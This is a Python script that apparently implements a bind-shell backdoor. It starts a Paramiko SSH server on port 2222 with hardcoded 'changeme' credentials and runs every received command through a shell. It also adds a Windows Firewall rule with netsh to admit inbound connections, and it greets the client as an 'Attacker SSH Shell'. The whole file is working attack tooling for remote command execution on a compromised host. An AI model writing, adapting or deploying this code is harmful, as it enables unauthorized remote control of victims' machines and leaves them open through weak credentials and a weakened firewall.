import paramiko
import socket
import threading
import subprocess
import logging
import os
import argparse  # Import the argparse module

# Set up logging
logging.basicConfig(level=logging.INFO)

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self.username = "changeme"  # Default username
        self.hostname = socket.gethostname()  # Get the hostname
        self.current_dir = os.getcwd()  # Get the current working directory

    def check_auth_password(self, username, password):
        if username == "changeme" and password == "changeme":  # Change this to a stronger authentication method
            self.username = username  # set the username after auth.
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def get_prompt(self):
        """Creates a more natural SSH prompt."""
        return f"{self.username}@{self.hostname}:{self.current_dir}$ "

def execute(command, ssh_server_instance):
    """Executes system commands and returns the output, handles cd."""
    command = command.strip()
    if not command:
        return ""

    if command.startswith("cd "):
        try:
            new_dir = command[3:].strip()
            if os.path.isabs(new_dir):
                os.chdir(new_dir)
            else:
                os.chdir(os.path.join(ssh_server_instance.current_dir, new_dir))
            ssh_server_instance.current_dir = os.getcwd()  # update the current directory
            return ""  # cd has no output.
        except FileNotFoundError:
            return f"cd: {new_dir}: No such file or directory\n"
        except Exception as e:
            return f"cd: {new_dir}: {e}\n"

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        return output.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return f"Execution failed: {e}\n"
    except FileNotFoundError:
        return f"Command not found: {command}\n"
    except Exception as e:
        return f"Error: {e}\n"

def get_local_ip():
    """Finds the attacker's local IP address automatically."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"  # Fallback to localhost

def check_port_available(port):
    """Checks if the port is free to use."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        result = sock.connect_ex(("127.0.0.1", port))
        return result != 0

def add_firewall_rule(port):
    """Adds a Windows Firewall rule to allow incoming SSH connections."""
    try:
        subprocess.run(
            f'netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=TCP localport={port}',
            shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        logging.info(f"[*] Firewall rule added to allow incoming SSH connections on port {port}.")
    except Exception as e:
        logging.error(f"[!] Failed to add firewall rule. Manually allow port in Windows Firewall. Error: {e}")

def ssh_server(firewall_enabled):
    """Starts an SSH server using Paramiko with an improved interface."""
    host = "0.0.0.0"  # Bind to all interfaces
    port = 2222  # Change if needed

    if not check_port_available(port):
        logging.error(f"[!] Port {port} is already in use. Choose another port.")
        return

    if firewall_enabled:
        add_firewall_rule(port)  # Add firewall rule
    else:
        logging.info(f"[*] Firewall rule not added. Ensure port {port} is open manually.")

    server_key = paramiko.RSAKey.generate(2048)

    # Create a listening socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(100)

    try:
        logging.info(f"[*] Starting SSH server on {host}:{port}...")
        client, addr = sock.accept()  # Accept first client.
        logging.info(f"[*] Connection received from {addr[0]}:{addr[1]}")

        server = paramiko.Transport(client)
        server.add_server_key(server_key)

        ssh_server_instance = SSHServer()  # create instance of SSHServer
        server.start_server(server=ssh_server_instance)

        chan = server.accept(20)  # Wait for a connection, with a 20 second timeout
        if chan is None:
            logging.error("[!] No connection received. Exiting.")
            return

        logging.info("[*] Authenticated! Shell ready.")
        chan.send(b"Welcome to Attacker SSH Shell\n")

        # Improved interaction loop
        while True:
            prompt = ssh_server_instance.get_prompt().encode()
            chan.send(prompt)  # Prompt for command
            command = chan.recv(1024).decode().strip()
            if not command:
                continue

            if command.lower() == "exit":
                chan.send(b"[*] Closing connection.\n")
                chan.close()
                break

            output = execute(command, ssh_server_instance)
            chan.send(output.encode())

    except Exception as e:
        logging.error(f"[!] Error: {e}")
    finally:
        if 'server' in locals():
            server.close()
        sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Start an SSH server.")
    parser.add_argument("-f", "--firewall", choices=['y', 'n'], default='y', help="Enable or disable firewall rule (y/n).")
    args = parser.parse_args()

    firewall_enabled = args.firewall.lower() == 'y'
    ssh_server(firewall_enabled)
